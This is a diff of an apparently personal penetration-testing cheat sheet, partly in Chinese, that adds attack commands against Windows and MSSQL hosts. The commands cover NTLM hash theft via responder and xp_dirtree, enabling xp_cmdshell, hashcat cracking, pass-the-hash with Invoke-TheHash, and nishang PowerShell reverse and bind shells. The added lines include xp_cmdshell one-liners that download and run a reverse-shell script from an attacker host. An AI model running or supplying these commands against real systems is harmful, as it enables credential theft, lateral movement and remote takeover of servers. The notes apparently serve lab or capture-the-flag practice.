@@ -222,7 +222,7 @@ crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
 
 ```
 # steal NTLM hash
-responder -I <interface>
+responder -I <interface> -v
 SQL> exec master ..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' 
 
 #try to enable code execution 
@@ -231,11 +231,15 @@ SQL> enable_xp_cmdshell
 #Execute code, 2 sintax, for complex and non complex cmds
 SQL> xp_cmdshell whoami /all
 SQL> EXEC xp_cmdshell 
+
+# connect smb server, this should steal the ntlm hash, need to use with responder tool
+SQL> exec master ..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' 
 ```
 
-### password recovery tool
+### crack hash 
 + hashcat
-`hashcat -a 0 hashes ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt`
+  + `hashcat -a 0 hashes ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt`
+  + `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O`
 
 ### Invoke-TheHash
 
@@ -258,7 +262,29 @@ SQL> EXEC xp_cmdshell
 
 + Invoke-TheHash
 
-`Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0`
+`Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0`
+
++ Invoke-PowershellTcp
+
+```
+The IP address to connect to when using the -Reverse switch.
+.PARAMETER Port
+
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress tun0IP -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port. 
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+```
 
 >此功能是所有其他功能的混合。 您可以傳遞多個主機，排除某人並選擇您要使用的選項（SMBExec、WMIExec、SMBClient、SMBEnum）。 如果您選擇 SMBExec 和 WMIExec 中的任何一個，但您沒有提供任何 Command 參數，它只會檢查您是否有足夠的權限。
 
@@ -270,6 +296,7 @@ SQL> EXEC xp_cmdshell
 ### Forensics
 
 + [Binwalk 分離提取隱寫的文件](https://github.com/ReFirmLabs/binwalk) 
+`binwalk -e [__.xlsm] --run-as=root`
 + Office analyzer
   + [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator)
   + [officeparser](https://github.com/unixfreak0037/officeparser)
@@ -281,8 +308,6 @@ SQL> EXEC xp_cmdshell
 
 
 ### MSSQL
-
-+ IMPACKET-MSSQLCLIENT REVERSE SHELL
 
 > 使用 Impacket mssqlclient，您將不需要執行手動操作，例如使用 SQL 腳本語言構建查詢以激活 xp_cmdshell。Impacket 讓事情變得更容易
 + [impacket 需先下載](https://github.com/SecureAuthCorp/impacket)
@@ -304,7 +329,10 @@ Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE
 statement to install.
 
 ```
-
-
++ IMPACKET-MSSQLCLIENT REVERSE SHELL
+  + 創建反向 shell，那麼你可以執行以下命令連接回在 nishang powershell 腳本中定義的 netcat 服務器
+    + `SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://tun0IP:ncport/rv.ps1\")`
+    + `EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(”http://tun0IP:ncport/rev.ps1”) | powershell -noprofile'`
+  
 
 
